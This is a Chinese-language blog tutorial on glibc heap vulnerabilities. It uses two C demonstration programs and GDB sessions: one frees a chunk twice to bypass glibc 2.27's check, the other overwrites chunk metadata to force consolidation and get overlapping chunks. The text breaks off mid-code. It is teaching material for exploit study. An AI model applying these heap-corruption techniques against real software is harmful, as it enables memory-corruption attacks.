<!DOCTYPE html>












  


<html class="theme-next pisces use-motion" lang="zh-CN">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge"/>
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2"/>
<meta name="theme-color" content="#222"/>
























<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2"/>

<link rel="stylesheet" href="/css/main.css?v=7.0.1"/>


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.0.1">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.0.1">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.0.1">


  <link rel="mask-icon" href="/images/logo.svg?v=7.0.1" color="#222">







<script id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '',
    scheme: 'Pisces',
    version: '7.0.1',
    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false,"dimmer":false},
    back2top: true,
    back2top_sidebar: false,
    fancybox: false,
    fastclick: false,
    lazyload: false,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>


  




  <meta name="description" content="堆漏洞前言我们要首先熟悉几种常见的堆漏洞类型，分别是Double Free，堆溢出以及UAF漏洞。一般是借助这些漏洞实现对free chunk的内容进行改写，进而实现漏洞利用 Double Free漏洞顾名思义，这种漏洞的原因是由于错误导致2次对同一个chunk连续释放了两次导致。我们可以通过一个动态调试一个例子，看看对于double free到底是如何影响堆的123456789101112131">
<meta property="og:type" content="article">
<meta property="og:title" content="堆利用系列二：堆漏洞">
<meta property="og:url" content="https://colorlight.github.io/2021/06/17/%E5%A0%86%E5%88%A9%E7%94%A8%E7%B3%BB%E5%88%97%E4%B9%8B%C2%96%E5%A0%86%E6%BC%8F%E6%B4%9E/index.html">
<meta property="og:site_name" content="Colorlight&#39;s Blog">
<meta property="og:description" content="堆漏洞前言我们要首先熟悉几种常见的堆漏洞类型，分别是Double Free，堆溢出以及UAF漏洞。一般是借助这些漏洞实现对free chunk的内容进行改写，进而实现漏洞利用 Double Free漏洞顾名思义，这种漏洞的原因是由于错误导致2次对同一个chunk连续释放了两次导致。我们可以通过一个动态调试一个例子，看看对于double free到底是如何影响堆的123456789101112131">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://colorlight.github.io/images/heap_exp/2021-05-18-14-49-52.png">
<meta property="og:image" content="https://colorlight.github.io/images/heap_exp/2021-05-18-14-53-35.png">
<meta property="og:image" content="https://colorlight.github.io/images/heap_exp/2021-05-18-14-57-21.png">
<meta property="og:image" content="https://colorlight.github.io/images/heap_exp/2021-05-18-14-57-45.png">
<meta property="og:image" content="https://colorlight.github.io/images/heap_exp/2021-05-18-15-41-57.png">
<meta property="og:image" content="https://colorlight.github.io/images/heap_exp/2021-05-18-15-50-32.png">
<meta property="og:image" content="https://colorlight.github.io/images/heap_exp/2021-05-18-15-51-09.png">
<meta property="og:image" content="https://colorlight.github.io/images/heap_exp/2021-05-18-16-07-37.png">
<meta property="og:image" content="https://colorlight.github.io/images/heap_exp/2021-05-18-16-08-01.png">
<meta property="og:image" content="https://colorlight.github.io/images/heap_exp/2021-05-18-16-12-39.png">
<meta property="og:image" content="https://colorlight.github.io/images/heap_exp/2021-05-18-16-18-05.png">
<meta property="og:image" content="https://colorlight.github.io/images/heap_exp/2021-05-18-17-27-26.png">
<meta property="og:image" content="https://colorlight.github.io/images/heap_exp/2021-05-18-17-28-36.png">
<meta property="og:image" content="https://colorlight.github.io/images/heap_exp/2021-05-18-17-32-11.png">
<meta property="og:image" content="https://colorlight.github.io/images/heap_exp/2021-05-18-17-44-15.png">
<meta property="og:image" content="https://colorlight.github.io/images/heap_exp/2021-05-18-17-58-45.png">
<meta property="og:image" content="https://colorlight.github.io/images/heap_exp/2021-05-18-17-59-23.png">
<meta property="og:image" content="https://colorlight.github.io/images/heap_exp/2021-05-18-17-56-06.png">
<meta property="og:image" content="https://colorlight.github.io/images/heap_exp/2021-05-19-14-46-03.png">
<meta property="og:image" content="https://colorlight.github.io/images/heap_exp/2021-05-19-14-53-13.png">
<meta property="og:image" content="https://colorlight.github.io/images/heap_exp/2021-05-24-12-22-24.png">
<meta property="og:image" content="https://colorlight.github.io/images/heap_exp/2021-05-19-15-35-50.png">
<meta property="og:image" content="https://colorlight.github.io/images/heap_exp/2021-05-19-15-41-25.png">
<meta property="og:image" content="https://colorlight.github.io/images/heap_exp/2021-05-19-15-45-18.png">
<meta property="og:image" content="https://colorlight.github.io/images/heap_exp/2021-05-19-15-47-18.png">
<meta property="article:published_time" content="2021-06-17T12:57:35.000Z">
<meta property="article:modified_time" content="2021-06-17T13:27:17.361Z">
<meta property="article:author" content="Colorlight">
<meta property="article:tag" content="堆利用">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://colorlight.github.io/images/heap_exp/2021-05-18-14-49-52.png">



  <link rel="alternate" href="/atom.xml" title="Colorlight's Blog" type="application/atom+xml"/>




  <link rel="canonical" href="https://colorlight.github.io/2021/06/17/堆利用系列之堆漏洞/"/>



<script id="page.configurations">
  CONFIG.page = {
    sidebar: "",
  };
</script>

  <title>堆利用系列二：堆漏洞 | Colorlight's Blog</title>
  












  <noscript>
  <style>
  .use-motion .motion-element,
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-title { opacity: initial; }

  .use-motion .logo,
  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

<meta name="generator" content="Hexo 5.4.0"></head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Colorlight's Blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
    
      
        <p class="site-subtitle">思维改变生活</p>
      
    
    
  </div>

  <div class="site-nav-toggle">
    <button aria-label="切换导航栏">
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>



<nav class="site-nav">
  
    <ul id="menu" class="menu">
      
        
        
        
          
          <li class="menu-item menu-item-home">

    
    
    
      
    

    

    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br/>首页</a>

  </li>
        
        
        
          
          <li class="menu-item menu-item-about">

    
    
    
      
    

    

    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br/>关于</a>

  </li>
        
        
        
          
          <li class="menu-item menu-item-tags">

    
    
    
      
    

    

    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br/>标签</a>

  </li>
        
        
        
          
          <li class="menu-item menu-item-categories">

    
    
    
      
    

    

    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br/>分类</a>

  </li>
        
        
        
          
          <li class="menu-item menu-item-archives">

    
    
    
      
    

    

    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br/>归档</a>

  </li>
        
        
        
          
          <li class="menu-item menu-item-sitemap">

    
    
    
      
    

    

    <a href="/sitemap.xml" rel="section"><i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br/>站点地图</a>

  </li>

      
      
        <li class="menu-item menu-item-search">
          
            <a href="javascript:;" class="popup-trigger">
          
            
              <i class="menu-item-icon fa fa-search fa-fw"></i> <br/>搜索</a>
        </li>
      
    </ul>
  

  

  
    <div class="site-search">
      
  <div class="popup search-popup local-search-popup">
  <div class="local-search-header clearfix">
    <span class="search-icon">
      <i class="fa fa-search"></i>
    </span>
    <span class="popup-btn-close">
      <i class="fa fa-times-circle"></i>
    </span>
    <div class="local-search-input-wrapper">
      <input autocomplete="off"
             placeholder="搜索..." spellcheck="false"
             type="text" id="local-search-input">
    </div>
  </div>
  <div id="local-search-result"></div>
</div>



    </div>
  
</nav>



  



</div>
    </header>

    
  
  
  
  

  

  <a href="https://github.com/colorlight" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" style="fill: #222; color: #fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>



    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          
            

          
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://colorlight.github.io/2021/06/17/%E5%A0%86%E5%88%A9%E7%94%A8%E7%B3%BB%E5%88%97%E4%B9%8B%C2%96%E5%A0%86%E6%BC%8F%E6%B4%9E/"/>

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Colorlight"/>
      <meta itemprop="description" content=""/>
      <meta itemprop="image" content="https://avatars1.githubusercontent.com/u/13530839?s=460&v=4"/>
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Colorlight's Blog"/>
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">堆利用系列二：堆漏洞

              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              

              
                
              

              <time title="创建时间：2021-06-17 20:57:35" itemprop="dateCreated datePublished" datetime="2021-06-17T20:57:35+08:00">2021-06-17</time>
            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/%E5%A0%86%E5%88%A9%E7%94%A8/" itemprop="url" rel="index"><span itemprop="name">堆利用</span></a></span>

                
                
              
            </span>
          

          
            
            
              
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
            
                <span class="post-meta-item-text">评论数：</span>
                <a href="/2021/06/17/%E5%A0%86%E5%88%A9%E7%94%A8%E7%B3%BB%E5%88%97%E4%B9%8B%C2%96%E5%A0%86%E6%BC%8F%E6%B4%9E/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count valine-comment-count" data-xid="/2021/06/17/%E5%A0%86%E5%88%A9%E7%94%A8%E7%B3%BB%E5%88%97%E4%B9%8B%C2%96%E5%A0%86%E6%BC%8F%E6%B4%9E/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <h2 id="堆漏洞"><a href="#堆漏洞" class="headerlink" title="堆漏洞"></a>堆漏洞</h2><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>我们要首先熟悉几种常见的堆漏洞类型，分别是Double Free，堆溢出以及UAF漏洞。一般是借助这些漏洞实现对free chunk的内容进行改写，进而实现漏洞利用</p>
<h2 id="Double-Free漏洞"><a href="#Double-Free漏洞" class="headerlink" title="Double Free漏洞"></a>Double Free漏洞</h2><p>顾名思义，这种漏洞的原因是由于错误导致2次对同一个chunk连续释放了两次导致。我们可以通过一个动态调试一个例子，看看对于double free到底是如何影响堆的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">    puts(&quot;The goal of this is to show how we can edit a freed chunk using a Double Free bug.&quot;);</span><br><span class="line">    puts(&quot;Editing freed chunks will allow us to overwrite heap metadata, which is crucial to a lot of heap attacks.&quot;);</span><br><span class="line">    puts(&quot;However a bug to edit the heap metadata is often just one piece of the exploitation process.\n&quot;);</span><br><span class="line"></span><br><span class="line">    printf(&quot;So we start off by allocating three chunks of memory. Let&apos;s also write some data to them.\n\n&quot;);</span><br><span class="line"></span><br><span class="line">    char *ptr0, *ptr1, *ptr2;</span><br><span class="line"></span><br><span class="line">    ptr0 = malloc(0x30);</span><br><span class="line">    ptr1 = malloc(0x30);</span><br><span class="line">    ptr2 = malloc(0x30);</span><br><span class="line"></span><br><span class="line">    char *data0 = &quot;00000000&quot;;</span><br><span class="line">    char *data1 = &quot;11111111&quot;;</span><br><span class="line">    char *data2 = &quot;22222222&quot;;</span><br><span class="line"></span><br><span class="line">    memcpy(ptr0, data0, 0x8);</span><br><span class="line">    memcpy(ptr1, data1, 0x8);   </span><br><span class="line">    memcpy(ptr2, data2, 0x8);</span><br><span class="line"></span><br><span class="line">    printf(&quot;Chunk0: @ %p\t contains: %s\n&quot;, ptr0, ptr0);</span><br><span class="line">    printf(&quot;Chunk1: @ %p\t contains: %s\n&quot;, ptr1, ptr1);</span><br><span class="line">    printf(&quot;Chunk2: @ %p\t contains: %s\n\n&quot;, ptr2, ptr2);</span><br><span class="line"></span><br><span class="line">    printf(&quot;Now is where the bug comes in. We will free the same pointer twice (the first chunk pointed to by ptr0).\n&quot;);</span><br><span class="line">    printf(&quot;In between the two frees, we will free a different pointer. This is because in several different versions of malloc, there is a double free check \n(however in libc-2.27 it will hit the tcache and this will be fine).\n&quot;);</span><br><span class="line">    printf(&quot;It will check if the pointer being free is the same as the last chunk freed, and if it is the program will cease execution.\n&quot;);</span><br><span class="line">    printf(&quot;To bypass this, we can just free something in between the two frees to the same pointer.\n\n&quot;);</span><br><span class="line"></span><br><span class="line">    free(ptr0); //-----------------------&gt; b1</span><br><span class="line">    free(ptr1);</span><br><span class="line">    free(ptr0); //-----------------------&gt; b2</span><br><span class="line">    </span><br><span class="line">    printf(&quot;Next up we will allocate three new chunks of the same size that we freed, and write some data to them. This will give us the three chunks we freed.\n\n&quot;);</span><br><span class="line"></span><br><span class="line">    char *ptr3, *ptr4, *ptr5;</span><br><span class="line"></span><br><span class="line">    ptr3 = malloc(0x30); //--------------&gt; b3</span><br><span class="line">    ptr4 = malloc(0x30);</span><br><span class="line">    ptr5 = malloc(0x30);</span><br><span class="line"></span><br><span class="line">    memcpy(ptr3, data0, 0x8);</span><br><span class="line">    memcpy(ptr4, data1, 0x8);   </span><br><span class="line">    memcpy(ptr5, data2, 0x8);</span><br><span class="line"></span><br><span class="line">    printf(&quot;Chunk3: @ %p\t contains: %s\n&quot;, ptr3, ptr3);  //-------------&gt; b4</span><br><span class="line">    printf(&quot;Chunk4: @ %p\t contains: %s\n&quot;, ptr4, ptr4);</span><br><span class="line">    printf(&quot;Chunk5: @ %p\t contains: %s\n\n&quot;, ptr5, ptr5);</span><br><span class="line"></span><br><span class="line">    printf(&quot;So you can see that we allocated the same pointer twice, as a result of freeing the same pointer twice (since malloc will reuse freed chunks of similar sizes for performance boosts).\n&quot;);</span><br><span class="line">    printf(&quot;Now we can free one of the pointers to either Chunk 3 or 5 (ptr3 or ptr5), and clear out the pointer. We will still have a pointer remaining to the same memory chunk, which will now be freed.\n&quot;);</span><br><span class="line">    printf(&quot;As a result we can use the double free to edit a freed chunk. Let&apos;s see it in action by freeing Chunk3 and setting the pointer equal to 0x0 (which is what&apos;s supposed to happen to prevent UAFs).\n\n&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    free(ptr3);</span><br><span class="line">    ptr3 = 0x0;</span><br><span class="line"></span><br><span class="line">    printf(&quot;Chunk3: @ %p\n&quot;, ptr3);</span><br><span class="line">    printf(&quot;Chunk5: @ %p\n\n&quot;, ptr5);</span><br><span class="line"></span><br><span class="line">    printf(&quot;So you can see that we have freed ptr3 (Chunk 3) and discarded it&apos;s pointer. However we still have a pointer to it. Using that we can edit the freed chunk.\n\n&quot;);</span><br><span class="line"></span><br><span class="line">    char *data3 = &quot;15935728&quot;;</span><br><span class="line">    memcpy(ptr5, data3, 0x8);</span><br><span class="line"></span><br><span class="line">    printf(&quot;Chunk5: @ %p\t contains: %s\n\n&quot;, ptr5, ptr5);</span><br><span class="line"></span><br><span class="line">    printf(&quot;Just like that, we were able to use a double free to edit a free chunk!\n&quot;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>我们编译好这个源代码，然后使用GEF GDB进行调试，笔者倾向于配合IDA看反编译代码。我们在b1处打断点，在GDB中观察heap的情况:<br><img src="/images/heap_exp/2021-05-18-14-49-52.png" alt><br>可以看到我们已经分配了3个chunk去存储了3个字符串。<br><img src="/images/heap_exp/2021-05-18-14-53-35.png" alt><br>而此时各种bin和tcache上面还是什么都没有，因为我们并没有释放任何chunk。<br>为了避免double free的检测，需要在连续free之间添加一个free(ptr1)，这样就可以绕过double free的检测,我们在b2进行断点在观察heap的情况<br><img src="/images/heap_exp/2021-05-18-14-57-21.png" alt><br><img src="/images/heap_exp/2021-05-18-14-57-45.png" alt><br>我们可以发现tcache的0x40大小的链表已经存储了两个free chunk。<br>再通过在b3处下断点，观察double free给heap造成的影响：后来发现直接被检测出了double free<br><img src="/images/heap_exp/2021-05-18-15-41-57.png" alt><br>发现应该是glibc的版本太高了，已经无法这么简单地绕过double free了，根据源代码中的提示，glibc版本为2.27，参考<a href="https://blog.csdn.net/weixin_44864859/article/details/107237134" target="_blank" rel="noopener">关于Linux下更换不同glibc版本的解决方法</a>，使用glibc-all-in-one和patchelf对编译好的二进制文件直接替换其ld和libc的链接库地址，指向2.27版本的再次进行调试.</p>
<p>在b2处的堆内存情况为<br><img src="/images/heap_exp/2021-05-18-15-50-32.png" alt><br>在b3处的堆内存情况为<br><img src="/images/heap_exp/2021-05-18-15-51-09.png" alt><br>经过两次释放我们我可以看到addr=0x555555758670这个chunk被放到了tcache 0x40 大小的链表上两次</p>
<p>在b4处下断点，观察新的3个malloc返回地址是什么，以及现在的heap状态<br><img src="/images/heap_exp/2021-05-18-16-07-37.png" alt><br><img src="/images/heap_exp/2021-05-18-16-08-01.png" alt><br>这个地方实际上GEF貌似是有点问题的，tcache里面实际上已经没有chunk了，count为0，但是还是显示有一个，这应该是是一个bug。 </p>
<p>标准输出的结果<br><img src="/images/heap_exp/2021-05-18-16-12-39.png" alt><br>我们可以看出来，ptr3和ptr5实际上是返回的同一块地址。</p>
<p>因此当后面我们继续释放ptr3，并且把ptr3的值指向0x0,我们还是可以操作这个已经被释放的块的<br>根据标准输出的结果<br><img src="/images/heap_exp/2021-05-18-16-18-05.png" alt></p>
<p>我们先不用管能够修改已经被释放的空闲块中的内容到底有什么用，我们只考虑现在我们的Double free是可以实现这个目标的，当我把剩下的heapoveflow和UAF介绍完了再去解释修改空闲块到底有什么意义。</p>
<p>所以double free到能修改free chunk最简单抽象是首先两次free同一块地址，然后再连续两次malloc相同大小，然后再free其中一个，那么剩下那个指针指向的就是空闲块的chunk，而且还是可以被修改的。总结就是2次free，2次malloc，一次free，最终得到可用的空闲块指针。</p>
<h2 id="堆溢出漏洞"><a href="#堆溢出漏洞" class="headerlink" title="堆溢出漏洞"></a>堆溢出漏洞</h2><p>下面我们将通过一个堆溢出实例，观察堆溢出是如何触发了空闲块的融合，并且得到空闲块的控制权的。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">    puts(&quot;The goal of this is to show how we can edit a freed chunk using a heap overflow bug to cause consolidation.&quot;);</span><br><span class="line">    puts(&quot;Editing freed chunks will allow us to overwrite heap metadata, which is crucial to a lot of attacks.&quot;);</span><br><span class="line">    puts(&quot;However a bug to edit the heap metadata is often just one piece of the exploitation process.\n&quot;);</span><br><span class="line"></span><br><span class="line">    printf(&quot;We will start off by allocating four separate chunks of memory. The first three will be used for the heap consolidation.\n&quot;);</span><br><span class="line">    printf(&quot;The last one will be used to essentially separate this from the heap wilderness, and we won&apos;t do anything with it.\n\n&quot;);</span><br><span class="line"></span><br><span class="line">    unsigned long *ptr0, *ptr1, *ptr2, *ptr3, *ptr4, *ptr5;</span><br><span class="line"></span><br><span class="line">    ptr0 = malloc(0x500);</span><br><span class="line">    ptr1 = malloc(0x70);</span><br><span class="line">    ptr2 = malloc(0x500);</span><br><span class="line">    ptr3 = malloc(0x30);</span><br><span class="line"></span><br><span class="line">    printf(&quot;Chunk 0: %p\t Size: 0x500\n&quot;, ptr0);</span><br><span class="line">    printf(&quot;Chunk 1: %p\t Size: 0x70\n&quot;, ptr1);</span><br><span class="line">    printf(&quot;Chunk 2: %p\t Size: 0x500\n&quot;, ptr2);</span><br><span class="line">    printf(&quot;Chunk 3: %p\t Size: 0x30\n\n&quot;, ptr3);</span><br><span class="line"></span><br><span class="line">    printf(&quot;Now the reason why the first and second chunks are 0x500 in sizes, is because they will be the ones we are freeing. In the most recent libc versions (2.26 &amp; 2.27), there is a tcache mechanism.\n&quot;);</span><br><span class="line">    printf(&quot;If these chunks were much smaller, they would be stored in the tcaching mechanism and this wouldn&apos;t work. So I made them large so they wouldn&apos;t end up in the tcache.\n\n&quot;);</span><br><span class="line">    </span><br><span class="line">    printf(&quot;Start off by freeing ptr0, and clearing the pointer (which is often done when heap chunks get freed to avoid a use after free).\n\n&quot;);</span><br><span class="line"></span><br><span class="line">    free(ptr0);  //----------&gt;b1</span><br><span class="line">    ptr0 = 0;    //----------&gt;b2</span><br><span class="line"></span><br><span class="line">    printf(&quot;Chunk 0: %p\n\n&quot;, ptr0);</span><br><span class="line"></span><br><span class="line">    printf(&quot;Now is where the heap overflow bug comes into play. We will overflow the heap metadata of ptr2. We can see that the size of ptr2 is 0x511.\n\n&quot;);</span><br><span class="line"></span><br><span class="line">    printf(&quot;Size of Chunk 2 @ %p\t Metadata Size: 0x%lx\n\n&quot;, ptr2, ptr2[-1]);</span><br><span class="line"></span><br><span class="line">    printf(&quot;0x500 bytes for the data, 0x10 bytes for the metadata, and 0x1 byte to designate that the previous chunk is in use. Our overflow will overwrite this, and the previous size value.\n&quot;);</span><br><span class="line">    printf(&quot;We will overwrite the size to be 0x510, essentially clearing the previous in use bit. This way when we free this chunk, it will think that the previous chunk has been freed (which it hasn&apos;t).\n&quot;);</span><br><span class="line">    printf(&quot;So following that, we will place a fake previous size which is the previous QWORD behind the size. We will put it as 0x590, so it thinks that the previous chunk goes all the way back to where Chunk 0 is.\n&quot;);</span><br><span class="line">    printf(&quot;Then when we free Chunk 2, it will consolidate the heap past chunk 1 and up to chunk 0. Then we can start allocating memory from where Chunk 0, and get an overlapping pointer to where Chunk 1 is, since it thinks it has been freed.\n&quot;);</span><br><span class="line">    printf(&quot;Let&apos;s do the overwrite.\n\n&quot;);</span><br><span class="line"></span><br><span class="line">    ptr1[14] = 0x590;</span><br><span class="line">    ptr1[15] = 0x510;</span><br><span class="line"></span><br><span class="line">    printf(&quot;Chunk 2 @ %p\nPrevious Size: 0x%lx\nSize: 0x%lx\n\n&quot;, ptr2, ptr2[-2], ptr2[-1]);</span><br><span class="line"></span><br><span class="line">    printf(&quot;Now we free chunk 2 to cause consolidation.\n\n&quot;);</span><br><span class="line"></span><br><span class="line">    free(ptr2); //------------------&gt;b3</span><br><span class="line">    ptr2 = 0;   //------------------&gt;b4</span><br><span class="line"></span><br><span class="line">    printf(&quot;Now we can allocate a 0x500 chunk and an 0x70 chunk, and we wil get a pointer to where chunk 1 was.\n\n&quot;);</span><br><span class="line">    ptr4 = malloc(0x500);</span><br><span class="line">    ptr5 = malloc(0x70);    </span><br><span class="line"></span><br><span class="line">    printf(&quot;Chunk 4: %p\t Size: 0x500\n&quot;, ptr4);</span><br><span class="line">    printf(&quot;Chunk 5: %p\t Size: 0x30\n\n&quot;, ptr5);</span><br><span class="line"></span><br><span class="line">    printf(&quot;With that we can just free Chunk 1 (which is the same as Chunk 5), and we will be able to edit a freed heap chunk.\n\n&quot;);</span><br><span class="line"></span><br><span class="line">    free(ptr1);  //-------------------&gt;b5</span><br><span class="line">    ptr1 = 0;   //-------------------&gt;b6</span><br><span class="line"></span><br><span class="line">    char *data = 